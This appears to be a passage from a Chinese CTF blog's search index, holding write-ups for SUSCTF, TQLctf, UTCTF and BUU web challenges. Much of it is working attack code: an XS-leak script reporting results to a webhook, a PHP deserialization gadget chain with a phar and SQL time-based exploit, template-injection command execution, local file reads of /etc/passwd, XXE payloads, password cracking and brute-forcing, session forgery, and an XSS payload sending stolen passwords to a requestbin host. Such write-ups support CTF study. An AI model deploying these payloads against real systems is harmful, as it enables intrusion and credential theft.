content=&quot;ie=edge&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; var flag = 'SUSCTF{' function send(msg) { fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg)) } function trying(keyword) { return new Promise(resolve =&gt; { var win = window.open('http://123.60.29.171:10001/search?q=' + keyword) setTimeout(() =&gt; { win.location = 'http://e050-220-133-126-220.ngrok.io/non.html' setTimeout(() =&gt; { if (win.history.length === 3) { send('success:' + keyword) } else { //send('fail:' + keyword) } win.close(); }, 1000) }, 1500) }) } async function run() { send('start') // }abcdefghijklmnopqrstuvwxyz0123456789_ // }abcdefghijklmnopqrs // let chars = '_abcdefghijklmnopqrstuv'.split('') //let chars = '}wxyz0123456789_'.split('') for(let char of chars) { const temp = flag + char trying(temp) } } setTimeout(() =&gt; { run() }, 1000) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; HTML practiceä½¿ç”¨##å¯ä»¥è®©é¡µé¢ç©ºç™½â€”â€”&gt;makoæ¡†æ¶ï¼Œ å¯ä»¥ä½¿ç”¨ä¸‹é¢è¯­å¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æ— å›æ˜¾ç»“æœï¼Œä¸è¿‡å¯ä»¥å­˜åˆ°å…¶ä»–æ–‡ä»¶å¤¹é‡Œï¼Œä½¿ç”¨æ–‡ä»¶é‡å®šå‘ç¬¦å· % for a in (self.module.cache.util.os.system(name),2,3): 1% endfor","link":"/2022/03/03/2022SUSCTF/"},{"title":"2022TQLctf","text":"sql_testçœ‹åˆ°è¿™é¢˜æœ‰æŒ–æ˜åˆ©ç”¨é“¾çš„æ“ä½œï¼Œå­¦ä¸€ä¸‹ï¼Œæ„Ÿè§‰è‡ªå·±é’ˆå¯¹æ¡†æ¶çš„é“¾å­æŒ–æ˜è¿˜æ˜¯å¾ˆé™Œç”Ÿ è¿™æ˜¯ä¸€ä¸ªsymphonyçš„ç›®å½•ï¼Œæ‰€ä»¥å…ˆè®¤è¯†ä¸€ä¸‹è¿™ä¸ªæ¡†æ¶ï¼Œäº†è§£é¡¹ç›®ä¹‹é—´çš„æ–‡ä»¶å…³ç³» config/:åŒ…å«é…ç½®æ–‡ä»¶src/:æ‰€æœ‰çš„phpæºä»£ç templates/:Twigæ¨¡æ¿æ–‡ä»¶bin/ï¼šè¿™é‡Œé¢ä¸»è¦æ˜¯ä½¿ç”¨consoleæ–‡ä»¶,è¿›è¡Œæ‰§è¡Œç›¸å…³symfonyå‘½ä»¤var/ï¼šä¸»è¦æ˜¯åŒ…å«:ç¼“å­˜æ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶vendor/ï¼šç¬¬ä¸‰æ–¹åº“æ–‡ä»¶public/ï¼šwebç½‘ç«™æ ¹ç›®å½•ï¼Œå¦‚æœä½¿ç”¨apacheã€nginxè¿™æ ·çš„webæœåŠ¡å™¨ï¼Œéœ€è¦æŠŠæ ¹ç›®å½•æŒ‡å‘è¿™ä¸ªç›®å½• é¦–å…ˆæ˜¯æŒ–æ˜é“¾å­ï¼ŒæŒ–æ˜åˆ©ç”¨é“¾ï¼Œè‚¯å®šæ˜¯å…ˆæ‰¾åˆé€‚çš„destructï¼Œä½†æ˜¯ç¿»äº†ä¸€ä¸‹ï¼Œå‘ç°destructå¾ˆå¤šéƒ½æœ‰wake_upæ–¹æ³•ï¼Œæ‰€ä»¥è½¬æ¢æ€è·¯ï¼Œä»å…¶ä»–é­”æœ¯æ–¹æ³•å…¥æ‰‹ï¼Œå…ˆçœ‹çœ‹callæ–¹æ³•,å‘ç°äº†ä¸¤ä¸ªå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼Œå¾ˆæ˜æ˜¾ï¼Œä¸‹é¢é‚£ä¸ªåˆ©ç”¨èµ·æ¥ä¼šæ›´æ–¹ä¾¿ä¸€äº› public function __call($method, $args) { if (preg_match('/(.*)(Debug|Info|Notice|Warning|Error|Critical|Alert|Emergency)(.*)/', $method, $matches) &gt; 0) { $genericMethod = $matches[1] . ('Records' !== $matches[3] ? 'Record' : '') . $matches[3]; $level = strtolower($matches[2]); if (method_exists($this, $genericMethod)) { $args[] = $level; return call_user_func_array([$this, $genericMethod], $args); } } throw new \\BadMethodCallException('Call to undefined method ' . get_class($this) . '::' . $method . '()'); } åœ¨è¿™é‡Œï¼Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„invoke()å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å»çœ‹çœ‹æœ‰æ²¡æœ‰é€‚åˆçš„ namespace Symfony\\Component\\Cache\\Traits; public function __call(string $method, array $args){ $this-&gt;redis ?: $this-&gt;redis = $this-&gt;initializer-&gt;__invoke(); return $this-&gt;redis-&gt;{$method}(...$args);} å¯ä»¥å‘ç°ï¼Œåœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªåŠ¨æ€è°ƒç”¨ namespace Symfony\\Component\\Console\\Helper; public function __invoke($var): string { return ($this-&gt;handler)($var); }} æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾ä¸€ä¸‹èƒ½ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå¹¶ä¸”æ‹¥æœ‰$xxx-&gt;xxx()çš„ç±»å³å¯ å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„destructæ‰§è¡Œçš„commitå‡½æ•°æœ‰æˆ‘ä»¬éœ€è¦çš„ public function __destruct(){ $this-&gt;commit();} é€šè¿‡æ‰§è¡Œ$item-&gt;getExpiryå³å¯ public function commit(): bool { if (! $this-&gt;deferredItems) { return true; } $now = microtime(true); $itemsCount = 0; $byLifetime = []; $expiredKeys = []; foreach ($this-&gt;deferredItems as $key =&gt; $item) { $lifetime = ($item-&gt;getExpiry() ?? $now) - $now; æ¥ä¸‹æ¥æˆ‘ä»¬ç»„è£…ä¸€ä¸‹ &lt;?phpnamespace Doctrine\\Common\\Cache\\Psr6{class CacheAdapter{ private $deferredItems; public function __construct() { $this-&gt;deferredItems =array(new \\Symfony\\Component\\Cache\\Traits\\RedisProxy()); }}}namespace Symfony\\Component\\Cache\\Traits { class RedisProxy { private $redis; private $initializer; private $ready = false; public function __construct() { $this-&gt;redis = &quot;id&quot;; $this-&gt;initializer = new \\Symfony\\Component\\Console\\Helper\\Dumper(); } }}namespace Symfony\\Component\\Console\\Helper { class Dumper { private $handler; public function __construct() { $this-&gt;handler = &quot;system&quot;; } }}namespace { $a = new Doctrine\\Common\\Cache\\Psr6\\CacheAdapter(); echo base64_encode(serialize($a));} ç„¶ååœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹å°±å¯ä»¥è·‘é€šäº†ï¼Œæ¥ä¸‹æ¥å¯»æ‰¾ä¸€ä¸‹ååºåˆ—åŒ–ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰unserializeï¼Œé‚£ä¸€èˆ¬å°±æ˜¯pharååºåˆ—åŒ–äº†ï¼Œéœ€è¦å¯»æ‰¾ä¸€ä¸‹ååºåˆ—åŒ–ç‚¹ã€‚ æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼ŒæˆåŠŸè§¦å‘ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªæ³¨å…¥ç‚¹,å…¶ä¸­keyå’Œvalueå¯æ§ï¼ŒæŸ¥è¯¢æ‰‹å†Œå¯çŸ¥ï¼Œkeyä¸ºé€‰æ‹©æ“ä½œçš„å‚æ•° MYSQLI_INIT_COMMAND - æˆåŠŸå»ºç«‹ MySQL è¿æ¥ä¹‹åè¦æ‰§è¡Œçš„ SQL è¯­å¥ é€šè¿‡ä½¿ç”¨è¿™ä¸ªæ“ä½œï¼Œå¯ä»¥æ‰§è¡Œvalueçš„å†…å®¹ public function index(Request $request): Response{ $con = mysqli_init(); $key = $request-&gt;query-&gt;get('key'); $value = $request-&gt;query-&gt;get('value'); if (is_numeric($key) &amp;&amp; is_string($value)) { mysqli_options($con, $key, $value); } äºŒåˆ†æ³•ç›²æ³¨ï¼Œæˆ‘ä»¬å‰é¢çŸ¥é“ï¼Œéœ€è¦æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œè€Œè¿™é‡Œæœ‰ä¸ªæ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰å†™å…¥æƒé™ çˆ†ç ´å‡ºå¯å†™å…¥ç›®å½• /tmp/ce4d60d5da0336986edff5e01d97cC3e/ æ‰€ä»¥æ‰§è¡Œsqlè¯­å¥è¿›è¡Œå†™å…¥ï¼Œwpä¸­å†™åˆ°mysqli_server_public_keyè¿™ä¸ªé€‰é¡¹è®¾è®¡åˆ°æ–‡ä»¶æ“ä½œï¼Œæ˜¯æŒ‡å®šæœåŠ¡ç«¯å…¬é’¥çš„è·¯å¾„ã€‚ å› ä¸ºcaching_sha2_passwordè®¤è¯æ–¹å¼ä¸‹æœåŠ¡å™¨ç«¯ä¼šä½¿ç”¨ç¼“å­˜ï¼Œå¦‚æœä¸æŒ‡å®šå…¬é’¥è¿æ¥å°±æ˜¯å‘æœåŠ¡å™¨è¯·æ±‚keyï¼Œæ‰€ä»¥ä¸€æ—¦è¯·æ±‚ä¸€æ¬¡æˆåŠŸè¿æ¥ä¼šä¿ç•™ç€ç¼“å­˜ï¼Œå¯¼è‡´ä¸ä¼šå»åŠ è½½æˆ‘ä»¬æŒ‡å®šçš„å…¬é’¥ã€‚åœ¨è¿™é‡Œå¯ä»¥é€šè¿‡æ‰§è¡ŒFLUSH PRIVILEGESçš„å‘½ä»¤æˆ–è€…ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œå¯¼è‡´è¿æ¥å¤±è´¥ï¼ŒåŒæ ·ä¼šè§¦å‘åŠ è½½å…¬é’¥çš„æ“ä½œ å®Œæ•´çš„payloadå¦‚ä¸‹ï¼š ä½†æ˜¯æœ¬åœ°èµ·äº†dockerä»¥åè·‘å¤±è´¥äº†ã€‚ã€‚ã€‚å¯èƒ½æ˜¯ç¯å¢ƒåŸå› å§ï¼Œæ¯•ç«Ÿç”¨äº†å‡ºé¢˜äººçš„expè·‘äº†ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯æˆ‘è§‰å¾—è¿˜æ˜¯åº”è¯¥å°è¯•ä¸€ä¸‹è¿™ä¸ªmysqlçš„ import requestsimport timeimport randomimport stringimport osimport binasciis=requests.session()url=&quot;http://110.42.133.120:7001&quot;def req(key, value): resp = requests.get(url + &quot;/index.php/test&quot;, params={'key': key, 'value': value}) return respdef get_secure_file_path(): file_path = &quot;&quot; for i in range(1,10000): low =0 high=264 mid=(low+high)//2 while(low&lt;high): payload = f&quot;select if (ascii(substr((select @@global.secure_file_priv),{i},1))&gt;{mid},sleep(5),1);&quot; #print(payload) fi_time=time.time() s.get(url+payload) if time.time()-fi_time&gt;4: low = mid+1 else: high=mid mid=(low+high)//2 if(mid==0 or mid==264): break file_path +=chr(mid) return file_pathdef exp(file_path): filename=&quot;&quot;.join(random.sample(string.ascii_letters,6))+'.phar' file=os.path.join(file_path,filename) hex_data=str(binascii.b2a_hex(open('test.phar','rb').read())).replace(&quot;b'&quot;,&quot;&quot;).replace(&quot;'&quot;,&quot;&quot;) print(hex_data) command=f&quot;select 0x{hex_data} into dumpfile '{file}'&quot; print(command) req('3',command) command=f&quot;select if((ISNULL(load_file('{file}'))),sleep(2),1);&quot; if req('3', command).elapsed.seconds &gt; 1.5: print(&quot;file write fail!&quot;) exit() req('3',&quot;FLUSH PRIVILEGES;&quot;) time.sleep(5) print(file) resp = req('35', 'phar://' + file) print(resp.text)if __name__=='__main__': #file_path=get_secure_file_path() file_path=&quot;/tmp/ce4d60d5da0336986edff5e01d97c73e/&quot; print(file_path) exp(file_path) echoåŠ ä¸Šè¦ç”¨çš„åŠŸèƒ½ç‚¹åç§°å°±èƒ½è¾“å‡ºvalueäº† è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpythonè¾“å‡ºçš„æ—¶å€™ä¼šè‡ªå¸¦ä¸€ä¸ªbâ€™ç¬¦å·è¦å°†ä»–ç½®æ¢ä¸ºç©ºï¼Œä¸ç„¶å½±å“å†™å…¥ç»“æœ","link":"/2022/02/26/2022TQLctf-0/"},{"title":"2022UTCTF","text":"HTMLPDFé¢˜ç›®éƒ½è¿˜çœ‹åˆ°å°±è¢«å¸ˆå‚…ä»¬åšå‡ºæ¥äº† é€šè¿‡ä½¿ç”¨ &lt;b&gt;Try Me!&lt;/b&gt;&lt;iframe src=&quot;/proc/self/cwd/app.py&quot; height=&quot;1600px&quot; width=&quot;800px&quot;&gt; å¯ä»¥è¯»åˆ°æºç  from flask import *import pdfkitimport subprocessimport timeimport osimport spwdimport cryptfrom hmac import compare_digest as compare_hashapp = Flask(__name__)@app.route('/', methods=['POST','GET'])def index(): if request.method == 'POST': html_content = request.form.get('content') if html_content is None: return render_template('index.html') if '/environ' in html_content: # Don't let them read the flag from /proc/&lt;pid&gt;/environ return 'Aren''t you sneaky? That''s a good idea, but not the intended solution, so keep trying :)' # Filenames. html = render_template('document.html', content=html_content) uid = str(hash(time.time())) # Using a hash of the time ensures unique filenames between requests. out_filename = uid+'.pdf' html_filename = uid+'.html' html_file = open(html_filename, 'w') html_file.write(html) html_file.close() # Generate PDF. TIMEOUT = '3' subprocess.run(['xvfb-run', 'timeout', '--preserve-status', '-k', TIMEOUT, TIMEOUT, 'wkhtmltopdf','--enable-local-file-access', html_filename, out_filename]) # Cleanup and return result. out_file = open(out_filename, 'rb') output = out_file.read() out_file.close() #os.remove(out_filename) #os.remove(html_filename) response = make_response(output) response.headers['Content-Type'] = 'application/pdf' response.headers['Content-Disposition'] = 'inline; filename=document.pdf' return response return render_template('index.html')@app.route('/admin', methods=['POST','GET'])def adminLogin(): if request.method == 'POST': username = request.form.get('username') password = request.form.get('password') if username is None or password is None: return render_template('login.html') # Check that username and password match a user in the system. try: pw1 = spwd.getspnam(username).sp_pwd pw2 = crypt.crypt(password, pw1) if compare_hash(pw2, pw1): return render_template('login.html', msg=os.environ['FLAG']) else: return render_template('login.html', msg='Incorrect password!') except KeyError: # No such username. return render_template('login.html', msg='Incorrect username!') return render_template('login.html')if __name__ == '__main__': app.run(host='0.0.0.0') å­˜åœ¨åŒæºç­–ç•¥ï¼Œå› æ­¤ä¸å…è®¸ç›´æ¥è·¨ç›®å½•å®ç°æ–‡ä»¶è¯»å–ï¼Œåªèƒ½è¯»å–webç›®å½•ä¸‹çš„ï¼Œç»•è¿‡æ–¹æ³•: &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; æ‹¿åˆ°å¯†ç ä»¥åï¼Œå‘ç°ä½¿ç”¨å¼±å¯†ç åŠ å¯†ï¼Œä½¿ç”¨johnçˆ†ç ´å¯†ç  john test_passwd websocketæŠ“åŒ…æŠ“ä¸åˆ°ä¸œè¥¿ï¼Œçœ‹èµ·æ¥æ˜¯è¦ç”¨socketå»è¿æ¥ï¼Œç„¶åçˆ†ç ´å¯†ç å§ import asyncioimport websocketsasync def hello(): with open(&quot;test_pa.txt&quot;,&quot;r&quot;) as f: paswd=f.readlines() for i in paswd: uri = &quot;ws://web1.utctf.live:8651/internal/ws&quot; async with websockets.connect(uri) as websocket: await websocket.send('begin') result = await websocket.recv() #print(result) await websocket.send('user admin') await websocket.send('pass '+i.replace(&quot;\\n&quot;,&quot;&quot;)) result = await websocket.recv() print(result) print(f'pass {i}'.replace(&quot;\\n&quot;,&quot;&quot;)) if result!= &quot;badpass&quot;: print(i) breakasyncio.get_event_loop().run_until_complete(hello())","link":"/2022/03/12/2022UTCTF/"},{"title":"2022tqlCTF","text":"","link":"/2022/02/23/2022tqlCTF/"},{"title":"buuåˆ·é¢˜","text":"[CISCN2019 åä¸œå—èµ›åŒº]Web4ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ssrfï¼Œå‘ç°ä½¿ç”¨local_file://å¯ä»¥è¯»å–æ–‡ä»¶ # encoding:utf-8import re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())app.config['SECRET_KEY'] = str(random.random()*233)app.debug = True@app.route('/')def index(): session['username'] = 'www-data' return 'Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;'@app.route('/read')def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response'@app.route('/flag')def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied'if __name__=='__main__': app.run( debug=True, host=&quot;0.0.0.0&quot; ) ä¿®æ”¹sessionä¸ºfuckå³å¯ï¼Œæ‰€ä»¥ä¼ªé€ sessionå³å¯ï¼Œä½†æ˜¯æ²¡æœ‰çˆ†ç ´å‡ºå¯†ç ï¼Œå‘ç°æºç é‡Œé¢çš„key random.seed(uuid.getnode())app.config['SECRET_KEY'] = str(random.random()*233) local_file:///sys/class/net/eth0/address è¯»å–macåœ°å€ ç„¶åè®¡ç®—å¾—åˆ°key flask-unsign --sign --cookie &quot;{'username': b'fuck'}&quot; --secret '99.2806389887' [GoogleCTF2019 Quals]Bnvæœ‰æºç ï¼Œçœ‹åˆ°xmlï¼Œæƒ³åˆ°xxeæ”»å‡»ï¼Œè®°å¾—æ”¹ä¸€ä¸‹æŠ¥æ–‡å¤´ä¸ºxmlï¼Œç„¶åå‘é€äº†ä¸€ä¸‹æµ‹è¯•çš„æŠ¥æ–‡ï¼Œå‘ç°æœ‰ä¸ä¸€æ ·çš„å›æ˜¾äº† root and DTD name do not match 'root' and 'xxe', line 5, column 6 å‘ç°æ‰¾ä¸åˆ°DTDï¼Œäºæ˜¯åœ¨ä¸‹é¢å®šä¸€ä¸‹ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE message [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///D://phpStudy//WWW//aa.txt&quot;&gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt; æ­¤æ—¶å›æ˜¾ï¼Œ Failure to process entity xxe, line 7, column 15 ä¹Ÿå°±è¯´æ— æ³•æ­£å¸¸è¯»å–ï¼Œä¹Ÿå°±æ˜¯è¯´ä»–éœ€è¦ä¸€ä¸ªå†…éƒ¨çš„DTDæ–‡ä»¶ï¼Œ https://mohemiv.com/tags/xxe/ åœ¨block-postä¸­ä¹Ÿæåˆ°ï¼ŒLinuxè®¾å¤‡å¯èƒ½åœ¨/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtdä¸­æœ‰ä¸€ä¸ªDTDæ–‡ä»¶ã€‚å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶åˆä¸€ä¸ªåä¸ºISOamsaçš„å®ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥å†™DTDä»£ç ã€‚ç°åœ¨æˆ‘ä»¬æ¥åˆ¶ä½œDTDä»£ç ã€‚ æœ€ç»ˆpayload &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso '&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval;&amp;#x25;error;'&gt;%local_dtd;]&gt; è¿˜æœ‰ä¸€ä»¶äº‹æ˜¯ç”±äºDTDä»£ç æœ‰ä¸€äº›ç ´åXMLçš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ä»–ä»¬è¿›è¡Œè¿™æ ·çš„ç¼–ç  [GWCTF 2019]mypasswordç™»å½•è¿›å»ä»¥åï¼Œçœ‹åˆ°æœ‰ä¸ªåé¦ˆæ¡†ï¼Œæƒ³åˆ°xssï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å³å¯ if (document.cookie &amp;&amp; document.cookie != '') { var cookies = document.cookie.split('; '); var cookie = {}; for (var i = 0; i &lt; cookies.length; i++) { var arr = cookies[i].split('='); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie['user']) != &quot;undefined&quot; &amp;&amp; typeof(cookie['psw']) != &quot;undefined&quot;){ document.getElementsByName(&quot;username&quot;)[0].value = cookie['user']; document.getElementsByName(&quot;password&quot;)[0].value = cookie['psw']; }} å¯ä»¥çœ‹åˆ°usernameå’Œpasswordå·²ç»è½½å…¥è¡¨å•å½“ä¸­äº†ï¼Œåªè¦å°†ä»–ä»¬å¤–å¸¦å°±è¡Œäº†åˆ©ç”¨http://http.requestbin.buuoj.cn/18v8ark1?inspectè¿™ä¸ªå¹³å°å³å¯å®ç° &lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;&lt;scrcookieipt&gt; var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value; docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/18v8ark1/?a=&quot;+psw;&lt;/scrcookieipt&gt; [NPUCTF2020]ezloginxpathçš„sqlç›²æ³¨ https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8 xpathæ³¨å…¥æ”»å‡»XPathæ˜¯ä¸€ç§åœ¨XMLæ–‡æ¡£ä¸­æŸ¥æ‰¾ç›®æ ‡ä¿¡æ¯çš„è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥åœ¨XMLæ–‡æ¡£ä¸­å¯¹å…ƒç´ å’Œå±æ€§è¿›è¡Œéå†ã€‚XPathä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼æ¥é€‰å–XMLæ–‡æ¡£ä¸­çš„èŠ‚ç‚¹æˆ–èŠ‚ç‚¹é›†ã€‚ åœ¨XPathä¸­ï¼Œæœ‰ä¸ƒç§ç±»å‹çš„èŠ‚ç‚¹ï¼šå…ƒç´ ã€å±æ€§ã€æ–‡æœ¬ã€å‘½åç©ºé—´ã€å¤„ç†æŒ‡ä»¤ã€æ³¨é‡Šä»¥åŠæ–‡æ¡£ï¼ˆæ ¹ï¼‰èŠ‚ç‚¹ã€‚XML æ–‡æ¡£æ˜¯è¢«ä½œä¸ºèŠ‚ç‚¹æ ‘æ¥å¯¹å¾…çš„ã€‚æ ‘çš„æ ¹è¢«ç§°ä¸ºæ–‡æ¡£èŠ‚ç‚¹æˆ–è€…æ ¹èŠ‚ç‚¹ã€‚ Xpathå’ŒXqueryè¯­æ³•ï¼š â€œnodenameâ€ â€“ é€‰å–nodenameçš„æ‰€æœ‰å­èŠ‚ç‚¹ â€œ/nodenameâ€ â€“ ä»æ ¹èŠ‚ç‚¹ä¸­é€‰æ‹© â€œ//nodenameâ€ â€“ ä»å½“å‰èŠ‚ç‚¹é€‰æ‹© â€œ..â€ â€“ é€‰æ‹©å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ â€œchild::node()â€ â€“ é€‰æ‹©å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹ â€œ@â€ -é€‰æ‹©å±æ€§ â€œ//user[position()=2] â€œ é€‰æ‹©èŠ‚ç‚¹ä½ç½® ä¸‡èƒ½å¯†ç åœ¨çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥adminâ€™ or â€˜1â€™=â€™1ï¼Œç”±äºæ²¡æœ‰æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥åªèƒ½ç”¨å¼•å·è¿›è¡Œé—­åˆï¼Œ ä¸çŸ¥é“ç”¨æˆ·åçš„å¼ºç‹‚ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªor ?name=fake' or '1'or'1&amp;pwd=fake ä½¿ç”¨|æ“ä½œç¬¦ï¼ˆç”¨äºè®¡ç®—ä¸¤ä¸ªèŠ‚ç‚¹ï¼‰ ?name=1']|//*|ss['&amp;pwd=fakeå…¶ä¸­//*ç”¨äºåˆ—å‡ºæ–‡æ¡£æ‰€æœ‰å…ƒç´ ']|//*|//*['è¯¥payloadç”¨äºè®¿é—®xmlæ–‡æ¡£çš„æ‰€æœ‰èŠ‚ç‚¹ ç›²æ³¨xpathç›²æ³¨æ­¥éª¤1.åˆ¤æ–­æ ¹èŠ‚ç‚¹ä¸‹çš„èŠ‚ç‚¹æ•°2.åˆ¤æ–­æ ¹èŠ‚ç‚¹ä¸‹èŠ‚ç‚¹é•¿åº¦&amp;åç§°3.é‡å¤çŒœè§£å®Œæ‰€æœ‰èŠ‚ç‚¹ï¼Œè·å–æœ€åçš„å€¼ â€˜ or count(/)=1 or â€˜1 åˆ¤æ–­æœ‰å‡ ä¸ªæ ¹èŠ‚ç‚¹ â€˜ or string-length(name(/*[1]))=1 or â€˜1 è·å–æ ¹èŠ‚ç‚¹é•¿åº¦ â€˜ or substring(name(/*[1]), 1, 1)=â€™aâ€™ or â€˜1 è·å–å†…å®¹ é€šè¿‡æµ‹è¯•å‘ç°ï¼Œå½“â€™ or count(/)=1 or â€˜1æ—¶ï¼Œè¿”å›éæ³•æ“ä½œï¼Œå¦‚æœä¸º2ï¼Œåˆ™ä¸ºè´¦å·å¯†ç é”™è¯¯ï¼Œæ‰€ä»¥å­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼Œæ‰€æ ¹èŠ‚ç‚¹æ•°ä¸º1ï¼Œæ¥ä¸‹æ¥åˆ¤æ–­æ ¹èŠ‚ç‚¹ä¸‹çš„èŠ‚ç‚¹æ•° import requestsimport stringimport reimport randomimport jsons = requests.session()strs='abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'headers = {'Content-Type':'application/xml'}param='&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;'t=''for i in range(1,50): for j in strs: url = 'http://10506bbe-96d3-4ebf-99ca-6fddf8972f8a.node4.buuoj.cn:81/login.php' token=re.findall(param,s.get(url).text)[0] #æ¢æµ‹æœ‰å‡ ä¸ªèŠ‚ç‚¹ï¼š #data=f&quot;&lt;username&gt; ' or count(/)={i} or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot; æ¢æµ‹å‡ºæœ‰ä¸€ä¸ªèŠ‚ç‚¹ #data = f&quot;&lt;username&gt; ' or substring(name(/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot;#ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åç§°ä¸ºroot #data=f&quot;&lt;username&gt; ' or substring(name(/root/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot; #data = f&quot;&lt;username&gt; ' or substring(name(/root/accounts/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; #æ¢æµ‹userä¸‹çš„èŠ‚ç‚¹ï¼Œå‘ç°æœ‰ä¸‰ä¸ª #data = f&quot;&lt;username&gt;' or substring(name(/root/accounts/user/*[1]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; #data = f&quot;&lt;username&gt;' or substring(name(/root/accounts/user/*[2]), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; #æœ€åè¯»å–å€¼çš„æ—¶å€™ç›´æ¥è¾“å…¥è·¯å¾„å³å¯ï¼Œæ— éœ€åœ¨ç”¨name()åŒ…è£¹ data = f&quot;&lt;username&gt;' or substring(/root/accounts/user[2]/password/text(), {i}, 1)='{j}' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&quot; + token + &quot;&lt;/token&gt;&quot; print(data) r= s.post(url=url,headers=headers,data=data).text print(r) if 'éæ³•æ“ä½œ' in r: t += j print(t) break if j==0: exit() [æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp&lt;?phperror_reporting(0);class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\'/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try 